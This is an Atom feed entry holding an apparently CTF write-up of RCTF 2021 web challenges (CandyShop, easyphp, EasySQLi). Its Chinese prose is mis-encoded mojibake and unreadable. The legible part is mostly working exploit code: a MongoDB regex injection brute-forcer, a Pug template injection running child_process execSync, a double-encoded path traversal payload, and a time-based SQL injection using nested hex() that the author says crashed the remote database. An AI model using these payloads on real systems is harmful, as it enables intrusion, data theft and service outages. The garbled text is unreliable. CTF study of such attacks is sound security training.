<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>gml&#39;s blog</title>
  
  <subtitle>ä¸å¿µè¿‡å¾€ï¼Œä¸ç•å°†æ¥ã€‚</subtitle>
  <link href="https://igml.top/atom.xml" rel="self"/>
  
  <link href="https://igml.top/"/>
  <updated>2021-09-13T08:53:39.826Z</updated>
  <id>https://igml.top/</id>
  
  <author>
    <name>gml</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021 RCTF éƒ¨åˆ†Webé¢˜è§£</title>
    <link href="https://igml.top/2021/09/13/2021-RCTF/"/>
    <id>https://igml.top/2021/09/13/2021-RCTF/</id>
    <published>2021-09-13T05:47:23.000Z</published>
    <updated>2021-09-13T08:53:39.826Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™å‘¨æœ«æœ¬æ¥æœ‰æŠ¥å‘Šddlï¼Œè¯´å¥½çš„ä¸æ‰“ï¼Œç»“æœè¿˜æ˜¯å¿ä¸ä½å»çœ‹äº†é¢˜ï¼ˆROISçš„Webæ¯å¹´è¯„ä»·éƒ½ä¸é”™ï¼‰â€¦ æ‰“äº†ä¸¤å¤©ï¼Œæ—¶é—´å¤§éƒ¨åˆ†æµªè´¹åœ¨äº†ä¸¤ä¸ªsqlé¢˜ç›®ä¸Šã€‚é˜Ÿé‡Œä¹Ÿæ²¡å•¥äººæ‰“ï¼Œä¸€å…±æ‰“æ¯”èµ›çš„å°±å››ä¸ªäººã€‚</p><a id="more"></a><h1 id="CandyShop"><a href="#CandyShop" class="headerlink" title="CandyShop"></a>CandyShop</h1><p>é¦–å…ˆæ˜¯Mongodb æ³¨å…¥ï¼Œå¯ä»¥æ³¨å…¥å‡ºå¯†ç ã€‚</p><p>åé¢pugæ¨¡ç‰ˆæ¸²æŸ“ï¼Œaddresså¤„å¯ä»¥æ‹¼æ¥ä»£ç ï¼Œä½†æ˜¯æ²¡æœ‰requireï¼Œæ„é€ æˆä¸‹é¢è¿™ç§ï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled.png" alt="Untitled"></p><p>æ³¨æ„è¦æœ‰ç¼©è¿›ï¼Œä¸ç„¶ä¼šæŠ¥é”™å¾ˆå‘ã€‚æˆ‘æœ¬åœ°èµ·äº†ä¸ªç¯å¢ƒï¼Œè°ƒè¯•äº†ä¸€ä¼šæ‰å¯ä»¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">password</span>):</span></span><br><span class="line">    paramsPostDict = &#123;<span class="string">&quot;password[\x24regex]&quot;</span>: password, <span class="string">&quot;username[\x24regex]&quot;</span>: <span class="string">&quot;rabbit&quot;</span>&#125;</span><br><span class="line">    paramsPost = <span class="string">&quot;&amp;&quot;</span>.join(</span><br><span class="line">        <span class="string">&quot;%s=%s&quot;</span> % (k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> paramsPostDict.items())  <span class="comment"># Manually concatenated to avoid some encoded characters</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://123.60.21.23:23333&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://123.60.21.23:23333/user/register&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://123.60.21.23:23333/user/login&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You Bad Bad&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789abcdef&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;^&quot;</span> + data + c</span><br><span class="line">            <span class="keyword">if</span> req(payload):</span><br><span class="line">                data += c</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span> data</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;fail!&quot;</span></span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    password = exp()</span><br><span class="line">    session.post(<span class="string">&quot;http://123.60.21.23:23333/user/login&quot;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: password&#125;)</span><br><span class="line">    resp = session.post(<span class="string">&quot;http://123.60.21.23:23333/shop/order&quot;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;candyname&#x27;</span>: <span class="string">&#x27;bunny_candy&#x27;</span>,</span><br><span class="line">                                                               <span class="string">&#x27;address&#x27;</span>: <span class="string">&quot;gml&#x27; readonly)\r\n                                \x23&#123;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString(\&quot;utf8\&quot;)&#125;\r\n                                //&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span> resp.content</span><br></pre></td></tr></table></figure><h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>éœ€è¦ç»•è¿‡nginxå¯¹ /adminçš„è¿‡æ»¤ï¼Œä»¥åŠè·¯å¾„ä¸­è¦åŒ…å« login çš„æ£€æŸ¥ã€‚</p><p>è¿™ä¸ªé¢˜æ¯”è¾ƒå‘ï¼Œæˆ‘æœ¬åœ°èµ·ç¯å¢ƒç›´æ¥æŠ¥é”™ï¼Œå¿…é¡»dockerèµ·ï¼Œæ‰€ä»¥æˆ‘å°±åœ¨æºç é‡Œç”¨ var_dump è°ƒè¯•ã€‚</p><p>è·Ÿflightè·¯ç”±æºç ï¼Œ<a href="https://segmentfault.com/a/1190000017289717?sort=newest">https://segmentfault.com/a/1190000017289717?sort=newest</a></p><p>æœ€ç»ˆç”¨æ­£åˆ™åŒ¹é…urlçš„æ—¶å€™åœ¨<code>net/Route.php</code>ï¼š</p><p><img src="/2021/09/13/2021-RCTF/image-20210913140407636.png" alt="image-20210913140407636"></p><p>patternæ˜¯/adminçš„æ—¶å€™ï¼Œè¿™ä¸ªæ­£åˆ™æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#^&#x2F;admin&#x2F;?(?:\\?.*)?$#i</span><br></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-RCTF/Untitled1.png" alt="Untitled 1"></p><p>å¹¶ä¸”é»˜è®¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥ä½¿ç”¨<code>/Admin%3flogin</code> å¯ä»¥ç»•è¿‡ã€‚</p><p>åé¢è¿˜éœ€è¦bypasså¯¹ ../ çš„è¿‡æ»¤ï¼Œçœ‹çœ‹è¿™ä¸ª$request-&gt;query æ€ä¹ˆå¾—åˆ°çš„ï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled2.png" alt="Untitled 2"></p><p>è¿™é‡Œå› ä¸ºå‰é¢%3fé—®å·ç»•è¿‡ï¼Œå¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œ%3fè§£ç æˆäº†é—®å·ï¼Œåé¢çš„å˜æˆäº†å‚æ•°ï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled3.png" alt="Untitled 3"></p><p>å¯ä»¥çœ‹åˆ°loginè¢«è¯†åˆ«æˆäº†ä¸€ä¸ªGETå‚æ•°ï¼Œæ‰€ä»¥åé¢å°±å¯ä»¥æ‹¼æ¥&amp;æ¥ä¼ å…¥dataæ¥bypass WAF å¯¹$_GETçš„è¿‡æ»¤äº†ã€‚</p><p>ä½†æ˜¯ <code>/ADMIN%3flogin=1&amp;data=..%2f</code> ä¸æˆåŠŸï¼Œå› ä¸º%2fè§£ç åå˜æˆäº†/ï¼Œä¸­é—´çš„åˆå˜æˆè·¯å¾„äº†ã€‚è¿™é‡Œç»§ç»­è·Ÿæºç ï¼Œå‘ç° self::parseQuery é‡Œæœ‰ parse_urlï¼Œparse_urlä¼šè¿›è¡Œä¸€æ¬¡urldecodeï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled4.png" alt="Untitled 4"></p><p>æ‰€ä»¥äºŒæ¬¡ç¼–ç å¯ä»¥ç»•è¿‡ã€‚</p><p>payloadï¼š<code>/ADMIN%3flogin=1&amp;data=..%252f..%252f..%252fflag</code></p><h1 id="EasySQLi"><a href="#EasySQLi" class="headerlink" title="EasySQLi"></a>EasySQLi</h1><p>è¿™ä¸ªé¢˜åšäº†å¥½ä¹…ï¼Œæœ€åè¿˜å¥½ç»ˆäºå‡ºäº†ï¼Œè¿›è¡Œäº†å¾ˆå¤šçš„å°è¯•ã€‚ä¸è¿‡è¿™é¢˜ç›®ä»åšä¸‹æ¥åˆ°èµ›åè·Ÿå‡ºé¢˜äººäº¤æµï¼Œå­¦åˆ°äº†ä¸å°‘ã€‚</p><p>é¢˜ç›®é€»è¾‘å¾ˆç®€å•ï¼Œuser()å°±æ˜¯flagï¼Œéœ€è¦æ³¨å…¥å‡ºuser()çš„æ•°æ®ã€‚é—®é¢˜åœ¨äº where çš„æ¡ä»¶æ˜¯å‡çš„ï¼Œå¯¼è‡´order by çš„è¯­å¥ä¸ä¼šæ‰§è¡Œï¼ˆå…¶å®whereæ¡ä»¶æ˜¯çœŸçš„ä¹Ÿä¸èƒ½sleepï¼Œå› ä¸ºåªæœ‰ä¸€è¡Œæ•°æ®ä¸éœ€è¦order byï¼‰</p><p><img src="/2021/09/13/2021-RCTF/image-20210913141425316.png" alt="image-20210913141425316"></p><h2 id="å¤±è´¥çš„å°è¯•"><a href="#å¤±è´¥çš„å°è¯•" class="headerlink" title="å¤±è´¥çš„å°è¯•"></a>å¤±è´¥çš„å°è¯•</h2><p>pdo é»˜è®¤æ˜¯å¯ä»¥å †å çš„ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜æ²¡ç»™é…ç½®ï¼Œå°±éå¸¸éš¾å—ã€‚å¼€å§‹çš„æƒ³æ³•æ˜¯order by åé¢çš„è¯­å¥æ ¹æœ¬å°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œä¸å †å ä¸èƒ½åšï¼Œæ‰€ä»¥æµ‹è¯•äº†å¥½ä¹…é¢˜ç›®èƒ½ä¸èƒ½å †å ã€‚</p><p>æœ¬åœ°æ­å»ºäº†ä¸€ä¸ªéå¸¸è¿‘ä¼¼çš„ç¯å¢ƒï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbms=<span class="string">&#x27;mysql&#x27;</span>;     </span><br><span class="line">$host=<span class="string">&#x27;127.0.0.1&#x27;</span>; </span><br><span class="line">$port = <span class="string">&#x27;2333&#x27;</span>;</span><br><span class="line">$dbName=<span class="string">&#x27;test&#x27;</span>;    </span><br><span class="line">$user=<span class="string">&#x27;root&#x27;</span>;      </span><br><span class="line">$pass=<span class="string">&#x27;123456&#x27;</span>;    </span><br><span class="line">$dsn=<span class="string">&quot;<span class="subst">$dbms</span>:host=<span class="subst">$host</span>;port=<span class="subst">$port</span>;dbname=<span class="subst">$dbName</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $dbh = <span class="keyword">new</span> PDO($dsn, $user, $pass); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è¿æ¥æˆåŠŸ&lt;br/&gt;\n&quot;</span>;</span><br><span class="line">    $dbh = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">    <span class="keyword">die</span> (<span class="string">&quot;Error!: &quot;</span> . $e-&gt;getMessage() . <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$db = <span class="keyword">new</span> PDO($dsn, $user, $pass);</span><br><span class="line">set_time_limit(<span class="number">1</span>);</span><br><span class="line">$s = floatval(microtime());</span><br><span class="line"><span class="comment">// echo $s;</span></span><br><span class="line">$order = <span class="string">&#x27;1;select sleep(4)&#x27;</span>;</span><br><span class="line">$sql = <span class="string">&quot;SELECT CONCAT(&#x27;RCTF&#123;&#x27;,USER(),&#x27;&#125;&#x27;) AS FLAG WHERE &#x27;ğŸ¬å…³æ³¨å˜‰ç„¶ğŸ¬&#x27; = &#x27;ğŸ¬é¡¿é¡¿è§£é¦‹ğŸ¬&#x27; OR &#x27;ğŸ¬Watch Diana a dayğŸ¬&#x27; = &#x27;ğŸ¬Keep hunger awayğŸ¬&#x27; OR &#x27;ğŸ¬å˜‰ç„¶ã«æ³¨ç›®ã—ã¦ğŸ¬&#x27; = &#x27;ğŸ¬é£Ÿæ¬²ã‚’ããã‚‹ğŸ¬&#x27; ORDER BY <span class="subst">$order</span>;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> microtime().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$stm = $db-&gt;prepare($sql);</span><br><span class="line"><span class="keyword">echo</span> microtime().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$stm-&gt;execute();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Count <span class="subst">&#123;$stm-&gt;rowCount()&#125;</span>.&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">usleep((<span class="number">1</span> + floatval(microtime()) - $s) * <span class="number">1e6</span>);</span><br></pre></td></tr></table></figure><p>èµ·ä¸ª 8.0.21 çš„mysqlï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name sql  -e MYSQL_ROOT_PASSWORD=123456 -p 2333:3306 -d mysql:8.0.21</span><br></pre></td></tr></table></figure><p>é»˜è®¤pdoæ˜¯å¯ä»¥å †å çš„ï¼Œæ‰€ä»¥æœ¬åœ°è¿™ä¸ªç¯å¢ƒå †å æ²¡ä»€ä¹ˆé—®é¢˜ã€‚</p><p>è¿™ä¸ªé¢˜ä»£ç é‡Œæœ‰ä¸€äº›å¯¹æ—¶é—´çš„æ“ä½œï¼Œè¿™ä¸ª <code>set_time_limit(1);</code>åŠ ä¸Šæœ€åçš„ usleepï¼Œæˆ‘æœ¬æ¥ä»¥ä¸ºæ˜¯è®©è„šæœ¬è¿è¡Œæ—¶é—´æ’å®šä¸ºä¸€ç§’å·¦å³ï¼Œé˜²æ­¢æ—¶é—´ç›²æ³¨ã€‚ä½†æ˜¯æœ¬åœ°æµ‹è¯•å‘ç°ç›´æ¥orderè®¾ç½®æˆ <code>1;select sleep(4)</code>å°±å¯ä»¥sleep 4sã€‚google ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The set_time_limit() function and the configuration directive max_execution_time only affect the execution time of the script itself. Any time spent on activity that happens outside the execution of the script such as system calls using system(), stream operations, database queries, etc. is not included when determining the maximum time that the script has been running. This is not true on Windows where the measured time is real.</span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥mysqlæ“ä½œä¸å—è¿™ä¸ªå‡½æ•°çš„å½±å“ã€‚ä½†æ˜¯è¿œç¨‹å°±æ˜¯ä¸å»¶è¿Ÿï¼Œè¿™è®©æˆ‘å¯¹è¿œç¨‹æ˜¯å¦å¯ä»¥å †å äº§ç”Ÿäº†æ€€ç–‘ã€‚</p><p>æœ¬åœ°æµ‹è¯•è¿˜å‘ç°ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼Œå³ä½¿sleepï¼Œä½†æ˜¯è¿è¡Œphpè„šæœ¬ï¼Œé©¬ä¸Šå°± echo äº†è¡Œæ•°ã€‚æ‰€ä»¥ç¬¬äºŒæ¡è¯­å¥æ˜¯åœ¨åå°æ‰§è¡Œçš„ï¼Œè€Œä¸æ˜¯åœ¨æ‰§è¡Œé˜¶æ®µå¡ä½ã€‚ä»¥ä¸ºè¿™æ˜¯è€ƒç‚¹ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆåµç”¨ï¼ˆä¸èƒ½å †å ï¼‰ã€‚</p><p>ç»è¿‡äº†å¤§é‡çš„æœ¬åœ°æµ‹è¯•å’Œè¿œç¨‹å°è¯•ï¼Œå¯ä»¥åŸºæœ¬ç¡®å®šè¿œç¨‹ä¸èƒ½å †å æ³¨å…¥â€¦.</p><p>æ„Ÿè§‰ä¸æ˜¯æ—¶é—´ç›²æ³¨ï¼Œä½†æ˜¯é¢˜ç›®å¯¹æ—¶é—´çš„æ“ä½œç¡®å®å¥‡æ€ªï¼Œä¸€ç›´stuckï¼Œå°±å»çœ‹å¦ä¸€ä¸ªsqläº†ã€‚</p><p>ç›´åˆ°ç¬¬äºŒå¤©æ™šä¸Šæ”¾äº†hintï¼štime-basedã€‚ç»§ç»­ç¡¬ç€å¤´çš®çœ‹ï¼Œæƒ³åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆç”¨prepareå’Œexecuteè€Œä¸æ˜¯ç›´æ¥queryï¼Œè«é prepare çš„æ—¶å€™æœ‰å»¶è¿Ÿçš„æ–¹æ³•ï¼Ÿ</p><p>ç„¶åå°±æ˜¯å„ç§å°è¯•ï¼Œä½¿ç”¨mysql client ç»ˆç«¯çš„ prepare è¿›è¡Œæµ‹è¯•ï¼Œæµ‹è¯•å¾ˆå¤šå‘ç°åé¢è¿˜æ˜¯ä¸ä¼šæ‰§è¡Œâ€¦</p><h2 id="å‘ç°updatexml"><a href="#å‘ç°updatexml" class="headerlink" title="å‘ç°updatexml"></a>å‘ç°updatexml</h2><p>å¦ä¸€ä¸ª ns_shift_sql é¢˜ç›®æ˜¯è€ƒæŠ¥é”™çš„ï¼Œæˆ‘éšä¾¿åœ¨è¿™ä¸ªé¢˜ç›´æ¥æ‰”ä¸€ä¸ª updatexml æŠ¥é”™æ³¨å…¥çš„payloadï¼Œæ²¡æƒ³åˆ°å±…ç„¶åœ¨prepareé˜¶æ®µè¢«æ‰§è¡Œäº†ï¼š</p><p><img src="/2021/09/13/2021-RCTF/Untitled6.png" alt="Untitled 6"></p><p>ç¬é—´ç‹‚å–œï¼Œæ„Ÿè§‰å¯ä»¥æï¼Œä½†æ˜¯ä¸èƒ½ç”¨ sleepã€‚è¦æƒ³åŠæ³•è®©mysqlå»åšä¸€äº›è´¹æ—¶çš„æ“ä½œé€ æˆå»¶è¿Ÿï¼Œæ‰€ä»¥å°è¯•ç”¨ä¸€å¤§å †hexï¼Œå› ä¸ºè¿™ä¸ªè®¡ç®—é‡æ˜¯æˆå€å¢åŠ ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare a from  &quot;select 1 where 0 order by updatexml(1,concat(&#39;~&#39;,(if(1,(select length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#39;11111111&#39;))))))))))))))))))))))))))))))))))))))))))))))))))),&#39;a&#39;),1)),1)&quot;;</span><br></pre></td></tr></table></figure><p> ç»“æœmysqlè¿™ä¸ªå®¹å™¨ç›´æ¥æŒ‚äº†ï¼Œè€Œifåé¢æ”¹æˆ0ï¼Œä¸ä¼šæŒ‚ã€‚çœ‹æ ·å­å¯ä»¥ç›²æ³¨äº†ã€‚</p><p>æˆ‘ç›´æ¥è¯•äº†ä¸€ä¸‹æ‰“è¿œç¨‹ï¼Œç»“æœè¿œç¨‹ç¯å¢ƒ mysql ç›´æ¥æŒ‚äº†ã€‚å‡å°‘ç‚¹hexï¼Œç»è¿‡æµ‹è¯•ï¼Œå¤§çº¦30ä¸ªhexï¼Œé‡Œé¢æ•°æ®æ˜¯ â€˜1â€™ï¼Œä¸ä¼šæŒ‚æ‰ï¼Œå¹¶ä¸”è¿œç¨‹ç¯å¢ƒèƒ½å»¶æ—¶3ç§’å¤šï¼Œéå¸¸ä¸é”™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">order</span>):</span></span><br><span class="line">    paramsGet = &#123;</span><br><span class="line">        <span class="string">&quot;order&quot;</span>: order&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;e5c4d349d498b38170023dc707e5f7fc&quot;</span>&#125;</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    response = session.get(<span class="string">&quot;http://124.71.132.232:11002/&quot;</span>, params=paramsGet, headers=headers)</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    <span class="keyword">if</span> t2 - t1 &gt; <span class="number">2.5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tem = <span class="string">&quot;updatexml(1,concat(&#x27;~&#x27;,(if((substr(hex(user()),%s,1)=&#x27;%s&#x27;),(select+length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(&#x27;1&#x27;)))))))))))))))))))))))))))))))),&#x27;a&#x27;)),1),1)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span>:</span><br><span class="line">            payload = tem % (i, c)</span><br><span class="line">            <span class="keyword">if</span> req(payload):</span><br><span class="line">                data += c</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> i % <span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span> data.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;fail&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-RCTF/image-20210913144624261.png" alt="image-20210913144624261"></p><p>ä¸è¿‡åé¢æˆ‘å°è¯•æ‰“æŒ‚é¢˜ç›®ï¼Œå¥‡æ€ªçš„æ˜¯æ‰“ä¸æŒ‚äº†ã€‚è¿˜ä»¥ä¸ºå‡ºé¢˜äººé™åˆ¶äº†ï¼Œèµ›åé—®å‡ºé¢˜äººæ²¡æ”¹é¢˜ï¼Œåº”è¯¥æ˜¯è®¾ç½®äº† restart alwaysã€‚</p><h2 id="èµ›åäº¤æµ"><a href="#èµ›åäº¤æµ" class="headerlink" 